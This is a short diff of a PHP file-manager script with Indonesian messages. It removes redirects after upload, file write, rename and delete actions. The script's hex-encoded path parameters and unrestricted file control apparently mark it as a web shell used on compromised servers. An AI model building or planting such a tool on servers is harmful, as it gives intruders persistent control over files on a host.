@@ -151,7 +151,7 @@
             if (isset($_FILES['fileToUpload'])) {
                 $uploadFile = $path . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
                 if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadFile)) {
-                    echo "<script>alert('File berhasil di-upload.'); window.location='?path=" . hex($path) . "';</script>";
+                    echo "<script>alert('File berhasil di-upload.');</script>";
                 } else {
                     echo "<script>alert('Gagal meng-upload file.');</script>";
                 }
@@ -257,7 +257,7 @@
                     if ($handle) {
                         fwrite($handle, $_POST['content']);
                         fclose($handle);
-                        echo "<script>alert('File berhasil disimpan.'); window.location='?path=" . hex($path) . "';</script>";
+                        echo "<script>alert('File berhasil disimpan.');</script>";
                     } else {
                         echo "<script>alert('Gagal membuka file untuk ditulis.');</script>";
                     }
@@ -281,7 +281,7 @@
                     $newName = $_POST['new_name'];
                     $newPath = dirname($file) . DIRECTORY_SEPARATOR . $newName;
                     if (rename($file, $newPath)) {
-                        echo "<script>alert('File berhasil di-rename.'); window.location='?path=" . hex($path) . "';</script>";
+                        echo "<script>alert('File berhasil di-rename.');</script>";
                     } else {
                         echo "<script>alert('Gagal rename file.');</script>";
                     }
@@ -322,10 +322,10 @@
             $file = unhex($_GET['delete']);
             if (is_file($file)) {
                 unlink($file);
-                echo "<script>alert('File berhasil dihapus.'); window.location='?path=" . hex($path) . "';</script>";
+                echo "<script>alert('File berhasil dihapus.');</script>";
             } elseif (is_dir($file)) {
                 rmdir($file);
-                echo "<script>alert('Folder berhasil dihapus.'); window.location='?path=" . hex($path) . "';</script>";
+                echo "<script>alert('Folder berhasil dihapus.');</script>";
             }
         }
         // Renaming Folder (Directory)
